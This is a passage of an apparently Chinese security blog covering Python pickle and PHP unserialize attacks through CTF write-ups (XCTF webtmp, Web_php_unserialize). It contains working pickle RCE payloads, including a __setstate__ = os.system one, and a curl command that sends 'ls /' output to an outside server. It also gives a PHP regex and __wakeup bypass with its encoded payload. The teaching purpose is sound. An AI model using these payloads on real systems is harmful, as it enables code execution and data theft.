<p>利用c指令替换掉<code>czj</code>和<code>extrader</code>中两个字符串，将<code>pickle.dumps</code>后的<code>bytes</code>字符串中的<code>X\x03\x00\x00\x00czj</code>替换成<code>cblue\nname\n</code>，<code>X\x08\x00\x00\x00extrader</code>替换成<code>cblue\ngrade\n</code>随后base64编码后观察效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406180134773.png" alt loading="lazy"></p>
<p>可以清楚的看到c指令码替换成功，随后也成功的绕过了比较</p>
<p>但如果c指令的<code>module</code>被限制了呢？c指令（也就是GLOBAL指令）基于<code>find_class</code>这个方法，然而<code>find_class</code>可以被重写，如果c指令码只允许包含<code>__main__</code>这一个<code>module</code>，又该如何解决？代码如下</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> pickletools
<span class="token keyword">import</span> blue
<span class="token keyword">import</span> io
<span class="token keyword">import</span> sys
<span class="token keyword">class</span> <span class="token class-name">student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>grade<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>grade <span class="token operator">=</span> grade
    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>other<span class="token punctuation">)</span><span class="token punctuation">:</span>     
        <span class="token keyword">return</span> <span class="token builtin">type</span><span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> student <span class="token keyword">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token keyword">and</span> self<span class="token punctuation">.</span>grade <span class="token operator">==</span> other<span class="token punctuation">.</span>grade

<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment">#通过raise显示地引发异常。一旦执行了raise语句，raise后面的语句将不能执行。</span>
<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token string">'R'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'no reduce!'</span>
        <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>restricted_loads<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token keyword">not</span> student<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"false!"</span>
        x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">!=</span> student<span class="token punctuation">(</span>blue<span class="token punctuation">.</span>name<span class="token punctuation">,</span>blue<span class="token punctuation">.</span>grade<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">'Not equal >_&lt;'</span>
        <span class="token keyword">return</span> <span class="token string">'well done!'</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Something wrong"</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span></code></pre>

<p><code>blue.py</code>中：</p>
<pre class="language-python" data-language="python"><code class="language-python">name <span class="token operator">=</span> <span class="token string">"A"</span>
grade <span class="token operator">=</span> <span class="token string">"B"</span></code></pre>

<p>题目部分来自XCTF高校战疫的一道题：webtmp</p>
<p>这道题就将input的date的modules进行了判断，如果不是<code>__main__ student</code>则会引发错误然后退出，那该如何解决？</p>
<p>我们知道，通过GLOBAL引入的变量，可以看作是原变量的引用，<strong>当我们在栈上修改它的值</strong>，会导致原变量也被修改！思路如下：</p>
<ul>
<li>通过<code>__main__.blue</code>引入这一个<code>module</code>，由于命名空间还在main内，故不会拦截，也就是说，在<code>__main__</code>上再新构造一个模块，用来对数据进行改写</li>
<li>把一个<code>dict</code>压进栈，内容是<code>&#123;&#39;name&#39;:&#39;B&#39;,&#39;grade&#39;:&#39;B&#39;&#125;</code></li>
<li>执行<code>BUILD</code>指令，会改写<code>__main__.blue.name</code>和<code>__main__.blue.grade</code>，到这里<code>blue.name</code>和<code>blue.grade</code>已经被篡改成我们想要的内容</li>
<li>弹掉栈顶，现在栈变成空的</li>
<li>照抄正常的Student序列化之后的字符串，压入一个正常的<code>student</code>对象，<code>name</code>和<code>grade</code>分别是<code>&#39;B&#39;</code>和<code>&#39;B&#39;</code>由于</li>
</ul>
<p>由于栈顶是正常的<code>student</code>对象（<code>if</code>语句判断用过），<code>pickle.loads</code>会返回正常，于是到手的<code>student</code>对象<code>name</code>和<code>grade</code>都与<code>blue.name</code>、<code>blue.grade</code>对应了</p>
<p><code>payload</code>如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'\x80\x03c__main__\nblue\n&#125;(Vname\nVB\nVgrade\nVB\nub0c__main__\nstudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x01\x00\x00\x00BX\x05\x00\x00\x00gradeX\x01\x00\x00\x00Bub.'</span></code></pre>

<p>其中q指令可省略</p>
<p>把过程输出执行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200406221611185.png" alt loading="lazy"></p>
<p>可看到成功绕过了判断</p>
<h4 id="setstate"><a href="#setstate" class="headerlink" title="__setstate__"></a>__setstate__</h4><p>如果<code>inst</code>有<code>__setstate__</code>方法，则把<code>state</code>交给<code>__setstate__</code>方法来处理，否则的话，直接把<code>state</code>这个<code>dist</code>的内容，合并到<code>inst.__dict__</code>里面</p>
<p><code>__setstate__</code>与<code>__getstate__</code>的关系：<code>pickle</code>一个类的实例时，Python 将只 <code>pickle</code> 当它调用该实例的 <code>getstate()</code> 方法时返回给它的值。类似的，在 <code>unpickle</code> 时，Python 将提供经过 <code>unpickle</code> 的值作为参数传递给实例的 <code>setstate()</code> 方法。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools
<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>
  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>
     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>
     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__
  <span class="token keyword">def</span> <span class="token function">__setstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being unpickled with these values:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span> 
     self<span class="token punctuation">.</span>__dict__ <span class="token operator">=</span> d
     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">3</span>
f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>
f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>代码执行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407095734164.png" alt loading="lazy"></p>
<p>可看到<code>pickle</code>时执行了<code>__getstate__</code>方法，<code>unpickle</code>时执行了<code>__setstate__</code>方法，且使用了<code>__getstate__</code>方法返回的值</p>
<p>如果当原对象没有<code>__setstate__</code>这个方法的时候，如果我们构造了一个<code>&#123;&#39;__setstate__&#39;: os.system&#125;</code>来<code>BUILD</code>这个对象，就会造成任意代码执行，现在对象的<code>__setstate__</code>就变成了</p>
<p><code>os.system</code>，接下来再次利用<code>dir</code>来<code>BUILD</code>这个对象，就构成了<code>os.system(&#39;dir&#39;)</code>命令执行，实现了RCE</p>
<p><code>payload</code>：<code>b&#39;\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.&#39;</code></p>
<p>有如下代码：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools
<span class="token keyword">class</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
     self<span class="token punctuation">.</span>val <span class="token operator">=</span> <span class="token number">2020</span>
  <span class="token keyword">def</span> <span class="token function">__getstate__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm being pickled"</span><span class="token punctuation">)</span>
     self<span class="token punctuation">.</span>val <span class="token operator">*=</span> <span class="token number">2</span>
     <span class="token keyword">return</span> self<span class="token punctuation">.</span>__dict__
f <span class="token operator">=</span> Foo<span class="token punctuation">(</span><span class="token punctuation">)</span>
f_string <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
a <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
f_new <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f_string<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f_new<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> <span class="token string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb.'</span>
c <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>d<span class="token punctuation">)</span>
pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>c<span class="token punctuation">)</span></code></pre>

<p>执行结果如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200407100434411.png" alt loading="lazy"></p>
<p>可见成功执行了命令</p>
<p>完整payload如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token string">b'\x80\x03c__main__\nFoo\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVdir\nb0c__main__\nFoo\nq\x00)\x81q\x01&#125;q\x02X\x03\x00\x00\x00valq\x03K\x04sb.'</span></code></pre>

<p>恶意代码执行完后将栈弹空，然后压一个正常的<code>student</code>入栈</p>
<h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>其他模块的load也可以触发pickle反序列化漏洞。例如：<code>numpy.load()</code>先尝试以numpy自己的数据格式导入；如果失败，则尝试以pickle的格式导入。因此<code>numpy.load()</code>也可以触发pickle反序列化漏洞。</p>
<p>即使代码中没有<code>import os</code>，GLOBAL指令也可以自动导入<code>os.system</code>。因此，不能认为“我不在代码里面导入os库，pickle反序列化的时候就不能执行os.system”。</p>
<p>即使没有回显，也可以很方便地调试恶意代码。只需要拥有一台公网服务器，执行</p>
<pre class="language-none"><code class="language-none">os.system(&#39;curl your_server&#x2F;&#96;ls &#x2F; | base64&#96;&#39;)</code></pre>

<p>然后查询您自己的服务器日志，就能看到结果。这是因为：以反引号包含的代码，在sh中会直接执行，返回其结果。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></li>
<li><a href="https://mp.weixin.qq.com/s/3CLh1V9FZ36-Tw9ikUSsaA">python反序列化攻击</a></li>
<li><a href="https://www.cnblogs.com/cioi/p/12464592.html">从零开始的pickle反序列化学习</a></li>
<li><a href="https://ucasers.cn/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#cao_zuo_mab">Python反序列化漏洞与沙箱逃逸</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-反序列化</title>
    <url>/posts/d3333ead/</url>
    <content><![CDATA[<h2 id="Php"><a href="#Php" class="headerlink" title="Php"></a>Php</h2><p>php中常用的几种魔术方法和触发条件</p>
<pre class="language-php" data-language="php"><code class="language-php">__construct ：当一个对象创建时被调用
__destruct ：当一个对象销毁时被调用
__toString ：当一个类或对象被当作一个字符串被调用
__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发
__sleep ：当一个对象使用 serialize 时触发，序列化时触发
__get ：当一个对象读取不可访问属性的值时触发
__set ：当一个对象在给不可访问属性赋值时
__isset ：当一个对象当对不可访问属性调用 <span class="token keyword">isset</span> 或 <span class="token keyword">empty</span> 时触发
__unset ：当一个对象对不可访问属性调用 <span class="token keyword">unset</span> 时触发
__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发
__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用
__call ：当一个对象在对象上下文中调用不可访问的方法时触发 
__callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发</code></pre>

<p>不同属性之间的区别</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span>  变量（公有） 
直接将变量名反序列化出来 
<span class="token keyword">protected</span>  变量（受保护） 
\x00 <span class="token operator">+</span> <span class="token operator">*</span> <span class="token operator">+</span> \x00 <span class="token operator">+</span> 变量名 
<span class="token keyword">private</span>  变量（私有） 
\x00 <span class="token operator">+</span> 类名 <span class="token operator">+</span> \x00 <span class="token operator">+</span> 变量名</code></pre>

<span id="more"></span>

<hr>
<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><p>感谢xctf平台，题目<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1">链接</a></p>
<p>题目代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span></code></pre>

<p>由代码可知，题目提供了一个<code>var</code>参数给我们进行<code>get</code>传参，首先先对<code>var</code>进行<code>base64</code>解码，然后进入<code>if</code>判断语句，若判断条件不成立就进入<code>else</code>，进行<code>unserialize</code>操作，题目提供了一个<code>Demo</code>类来进行序列化操作，且其中的<code>__destruct</code>方法可以将代码显示出来，题目提示了<code>the secret is in the fl4g.php</code>，flag应该就在<code>fl4g.php</code>中，于是寻找突破点</p>
<p>题目限制条件：</p>
<blockquote>
<p>preg_match(‘/[oc]:\d+:/i’, $var)：对传入的var经过base64解密后的字符串进正则匹配，来防止反序列化操作</p>
<p><code>__wakeup</code>函数：<code>__wakeup()</code>是用在反序列化操作中。<code>unserialize()</code>会检查存在一个<code>__wakeup()</code>方法。如果存在，则先会调用<code>__wakeup()</code>方法，在这里这个函数会将<code>file</code>赋值为<code>index.php</code></p>
</blockquote>
<p>可是这两种方法都可以进行绕过：</p>
<blockquote>
<p>preg_match()：这个正则匹配函数是用来防止反序列化的开头的，如<code>O:4:</code>即可匹配上，但可以用+进行绕过，可以写成<code>O:+4:</code>反序列化函数一样识别</p>
<p><code>__wakeup</code>函数：<code>__wakeup()</code>漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。例如<code>O:4:&quot;Demo&quot;:1:</code>，Demo后面的1表示的就是类的属性个数，将1改大即可跳过<code>__wakeup</code>函数的执行</p>
</blockquote>
<p>于是构造payload：<code>O:+4:&quot;Demo&quot;:4:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></p>
<p>注意<code>file</code>前面的<code>Demo</code>左右需要有<code>%00</code></p>
<pre class="language-php" data-language="php"><code class="language-php">序列化后：
v1 表示 <span class="token keyword">public</span>   <span class="token operator">%</span><span class="token number">00</span>Demo<span class="token operator">%</span><span class="token number">00</span>v2 表示 <span class="token keyword">private</span><span class="token punctuation">(</span>Demo为类名<span class="token punctuation">)</span>   <span class="token operator">%</span><span class="token number">00</span><span class="token operator">*</span><span class="token operator">%</span><span class="token number">00</span>v3 表示 <span class="token keyword">protected</span>  v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3为属性名</code></pre>

<p><code>base64</code>编码后<code>TzorNDoiRGVtbyI6NDp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<blockquote>
<p>参考：<br><a href="https://www.jianshu.com/p/8f498198fc3d">php序列化与反序列化入门</a><br><a href="https://www.cnblogs.com/kacha886/p/9115503.html">魔术方法<code>__sleep()</code>,<code>__wakeup()</code></a><br><a href="http://blog.sina.com.cn/s/blog_15ebf299a0102xnug.html">__wakeup()函数漏洞以及实际漏洞分析</a></p>
</blockquote>
<p>PS：php代码审计是个大坑，刚接触的话上手还是有点困难，还是要多看看php代码，需要有面向对象编程的思想，否则代码量大的就比较难入手；序列化算是一个重点了吧，原来就接触过好多这样的题，但都不怎么看得懂，所以就都略过了，现在学了点php基础勉强能够看的懂，总之多看多思考，慢慢来吧。</p>
<hr>
<h3 id="极客大挑战-2019—PHP"><a href="#极客大挑战-2019—PHP" class="headerlink" title="极客大挑战-2019—PHP"></a>极客大挑战-2019—PHP</h3><p>界面：<br><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200324104326758.png" alt loading="lazy"></p>
<p>题目提示网站有备份，于是访问<code>www.zip</code>，得到网页源码：</p>
<p>index.php</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
  ......
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
    ......
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>world<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 85%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 440px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">text-shadow</span><span class="token punctuation">:</span>0px 0px 5px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>arial<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span>20px<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">bottom</span><span class="token punctuation">:</span> 80%<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span> 700px<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span>KaiTi<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>不愧是我！！！
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
